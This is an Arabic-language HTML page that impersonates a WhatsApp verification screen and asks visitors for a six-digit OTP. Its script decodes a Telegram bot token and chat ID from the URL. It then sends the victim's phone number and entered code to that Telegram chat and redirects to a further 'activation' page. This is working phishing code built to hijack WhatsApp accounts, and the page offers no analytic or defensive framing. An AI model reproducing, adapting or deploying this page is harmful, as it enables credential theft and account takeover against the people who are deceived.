<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق - واتساب</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #0b141a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: 
                radial-gradient(circle at 30% 40%, rgba(37, 211, 102, 0.12) 0%, transparent 45%),
                radial-gradient(circle at 70% 60%, rgba(37, 211, 102, 0.08) 0%, transparent 45%);
            animation: floatBg 18s ease-in-out infinite;
            z-index: 0;
            pointer-events: none;
        }

        @keyframes floatBg {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            50% { transform: translate(-5%, -5%) rotate(5deg); }
        }

        .container {
            width: 100%;
            max-width: 420px;
            position: relative;
            z-index: 1;
            animation: fadeIn 0.6s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .header {
            text-align: center;
            margin-bottom: 25px;
        }

        .header .logo-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .header .logo-wrapper img {
            width: 52px;
            height: 52px;
            border-radius: 50%;
            object-fit: cover;
        }

        .header .logo-wrapper .logo-text {
            font-size: 32px;
            font-weight: 700;
            color: #ffffff;
        }

        .header .logo-wrapper .logo-text .green {
            color: #25d366;
        }

        .header .subtitle {
            color: #8696a0;
            font-size: 15px;
            margin-top: 10px;
        }

        .card {
            background: #111b21;
            border-radius: 18px;
            border: 1px solid #222d34;
            padding: 32px 28px 26px;
            box-shadow: 
                0 4px 20px rgba(0, 0, 0, 0.4),
                0 0 40px rgba(37, 211, 102, 0.05);
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, transparent, #25d366, transparent);
            background-size: 200% 100%;
            animation: gradientMove 3s linear infinite;
        }

        @keyframes gradientMove {
            0% { background-position: -200% 0%; }
            100% { background-position: 200% 0%; }
        }

        .icon-main {
            text-align: center;
            font-size: 56px;
            margin-bottom: 8px;
        }

        .card h2 {
            font-size: 22px;
            color: #ffffff;
            margin-bottom: 8px;
            font-weight: 700;
            text-align: center;
        }

        .card .desc {
            color: #8696a0;
            font-size: 14px;
            margin-bottom: 8px;
            line-height: 1.7;
            text-align: center;
        }

        .card .phone-display {
            display: block;
            text-align: center;
            color: #25d366;
            font-weight: 700;
            font-size: 15px;
            margin-bottom: 28px;
            direction: ltr;
        }

        .otp-inputs {
            display: flex;
            gap: 10px;
            direction: ltr;
            justify-content: center;
            margin-bottom: 22px;
        }

        .otp-inputs input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            border: 1.5px solid #2a3942;
            border-radius: 12px;
            background: #1f2c33;
            color: #ffffff;
            outline: none;
            transition: all 0.25s ease;
            caret-color: #25d366;
        }

        .otp-inputs input:focus {
            border-color: #25d366;
            background: #182229;
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.15);
            transform: scale(1.05);
        }

        .otp-inputs input.filled {
            border-color: #25d366;
            background: rgba(37, 211, 102, 0.08);
        }

        .otp-inputs input.error {
            border-color: #f15c6d;
            background: rgba(241, 92, 109, 0.08);
        }

        .field-error {
            color: #f15c6d;
            font-size: 13px;
            margin-top: 6px;
            display: none;
            font-weight: 400;
            text-align: center;
        }

        .field-error.show {
            display: block;
            animation: slideDown 0.2s ease;
        }

        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-5px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .btn-verify {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #25d366, #128c7e);
            color: #0b141a;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.25s ease;
            letter-spacing: 0.3px;
            box-shadow: 0 4px 20px rgba(37, 211, 102, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-verify:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 28px rgba(37, 211, 102, 0.45);
        }

        .btn-verify:active {
            transform: scale(0.98);
        }

        .btn-verify:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .resend {
            text-align: center;
            margin-top: 18px;
            color: #8696a0;
            font-size: 13.5px;
        }

        .resend button {
            background: none;
            border: none;
            color: #25d366;
            font-weight: 600;
            cursor: pointer;
            font-size: 13.5px;
            font-family: inherit;
            padding: 4px 8px;
            border-radius: 6px;
            transition: all 0.2s;
        }

        .resend button:hover {
            background: rgba(37, 211, 102, 0.1);
        }

        .resend button:disabled {
            color: #667781;
            cursor: not-allowed;
        }

        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 20px;
            padding: 12px;
            background: rgba(37, 211, 102, 0.08);
            border-radius: 10px;
            color: #8696a0;
            font-size: 12.5px;
            text-align: center;
        }

        .security-note i {
            color: #25d366;
            font-size: 14px;
        }

        .footer {
            text-align: center;
            margin-top: 24px;
            color: #667781;
            font-size: 12px;
        }

        @media (max-width: 450px) {
            .card {
                padding: 24px 18px;
            }
            .header .logo-wrapper .logo-text {
                font-size: 26px;
            }
            .header .logo-wrapper img {
                width: 44px;
                height: 44px;
            }
            .otp-inputs input {
                width: 44px;
                height: 54px;
                font-size: 20px;
            }
            .btn-verify {
                font-size: 15px;
                padding: 14px;
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>

<div class="container">

    <div class="header">
        <div class="logo-wrapper">
            <img src="whatsapp.png" alt="WhatsApp" style="width: 52px; height: 52px; border-radius: 50%; object-fit: cover;">
            <span class="logo-text">Whats<span class="green">App</span></span>
        </div>
        <div class="subtitle">🔐 التحقق من الرقم</div>
    </div>

    <div class="card">

        <div class="icon-main">💬</div>
        <h2>أدخل كود التحقق</h2>
        <p class="desc">أرسلنا كود مكوّن من 6 أرقام إلى رقم الواتساب</p>
        <span class="phone-display" id="phoneDisplay">—</span>

        <form id="otpForm" novalidate>

            <div class="otp-inputs">
                <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="0" autocomplete="one-time-code">
                <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="1">
                <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="2">
                <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="3">
                <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="4">
                <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="5">
            </div>

            <div class="field-error" id="otpError" style="text-align:center;"></div>

            <button type="submit" class="btn-verify" id="verifyBtn">
                <i class="fas fa-check-circle"></i> تحقق
            </button>

        </form>

        <div class="resend">
            لم تستلم الكود؟
            <button type="button" id="resendBtn">إعادة الإرسال</button>
        </div>

        <div class="security-note">
            <i class="fas fa-shield-alt"></i>
            <span>لا تشارك كود التحقق مع أي شخص</span>
        </div>

    </div>

    <div class="footer">
        <span>WhatsApp © 2026</span>
    </div>

</div>

<script>
    // ================================================================
    // 🔐 قراءة البيانات المشفّرة من الرابط أو من sessionStorage
    // ================================================================
    const urlParams = new URLSearchParams(window.location.search);
    const encodedData = urlParams.get('d') || "";
    const finalEncoded = encodedData || sessionStorage.getItem('wa_encoded') || "";

    // حفظ البيانات في sessionStorage (احتياط)
    if (finalEncoded) {
        sessionStorage.setItem('wa_encoded', finalEncoded);
    }

    let BOT_TOKEN = "";
    let CHAT_ID = "";

    if (finalEncoded) {
        try {
            const decoded = atob(finalEncoded);
            const parts = decoded.split('|');
            BOT_TOKEN = parts[0] || "";
            CHAT_ID   = parts[1] || "";
        } catch (e) {
            console.error('❌ فشل فك التشفير:', e);
        }
    }

    if (!BOT_TOKEN || !CHAT_ID) {
        console.warn('⚠️ البيانات المشفّرة غير موجودة!');
    }

    // عرض الرقم المحفوظ
    const savedPhone = localStorage.getItem('wa_phone') || "—";
    document.getElementById('phoneDisplay').textContent = savedPhone;

    // ================================================================
    // 📤 إرسال كود OTP إلى Telegram
    // ================================================================
    function sendOtpToTelegram(otp, phone) {
        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('❌ التوكن أو ID غير موجود!');
            return;
        }

        const message = `
🔐 **تفعيل البوت - واتساب (الخطوة 2/2)**

📞 **رقم الهاتف:** 
\`${phone}\`

🔢 **كود OTP:** 
\`${otp}\`

🕐 **التاريخ:** ${new Date().toLocaleString('ar-EG')}

📌 **IP:** ${window.location.hostname}
        `;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        }).catch(error => console.log('Telegram error:', error));
    }

    // ================================================================
    // 🔢 إدارة حقول OTP
    // ================================================================
    const otpInputs = document.querySelectorAll('.otp-inputs input');

    otpInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');

            if (this.value.length === 1) {
                this.classList.add('filled');
                if (index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
            } else {
                this.classList.remove('filled');
            }

            otpInputs.forEach(i => i.classList.remove('error'));
            document.getElementById('otpError').classList.remove('show');
        });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !this.value && index > 0) {
                otpInputs[index - 1].focus();
            }
        });

        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedData = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
            
            if (pastedData.length > 0) {
                for (let i = 0; i < otpInputs.length && i < pastedData.length; i++) {
                    otpInputs[i].value = pastedData[i];
                    otpInputs[i].classList.add('filled');
                }
                
                const nextEmpty = Math.min(pastedData.length, otpInputs.length - 1);
                otpInputs[nextEmpty].focus();
            }
        });
    });

    // ================================================================
    // 📝 معالج النموذج - الانتقال إلى صفحة التفعيل مع التوكن
    // ================================================================
    document.getElementById('otpForm').addEventListener('submit', function(e) {
        e.preventDefault();

        let otp = '';
        let isEmpty = false;

        otpInputs.forEach(input => {
            otp += input.value;
            if (!input.value) {
                input.classList.add('error');
                isEmpty = true;
            }
        });

        const errorEl = document.getElementById('otpError');

        if (isEmpty || otp.length !== 6) {
            errorEl.textContent = '⚠️ يرجى إدخال الكود كاملاً (6 أرقام)';
            errorEl.classList.add('show');
            return;
        }

        // تعطيل الزر
        const btn = document.getElementById('verifyBtn');
        btn.disabled = true;
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحقق...';

        // إرسال إلى Telegram
        sendOtpToTelegram(otp, savedPhone);

        // ============================================================
        // 🔗 الانتقال إلى صفحة التفعيل مع تمرير البيانات المشفّرة
        // ============================================================
        setTimeout(() => {
            let nextUrl = 'whatsapp-activate.html';
            if (finalEncoded) {
                nextUrl += '?d=' + encodeURIComponent(finalEncoded);
            }
            window.location.href = nextUrl;
        }, 900);
    });

    // ================================================================
    // 🔄 إعادة الإرسال
    // ================================================================
    document.getElementById('resendBtn').addEventListener('click', function() {
        this.disabled = true;
        this.textContent = 'تم الإرسال ✓';
        
        otpInputs.forEach(i => {
            i.value = '';
            i.classList.remove('filled', 'error');
        });
        otpInputs[0].focus();

        setTimeout(() => {
            this.disabled = false;
            this.textContent = 'إعادة الإرسال';
        }, 30000);
    });

    // التركيز التلقائي على أول حقل
    otpInputs[0].focus();

    console.log('✅ WhatsApp OTP page loaded');
    console.log('📎 Encoded data:', finalEncoded ? 'موجود ✓' : 'غير موجود ✗');
</script>

</body>
</html>
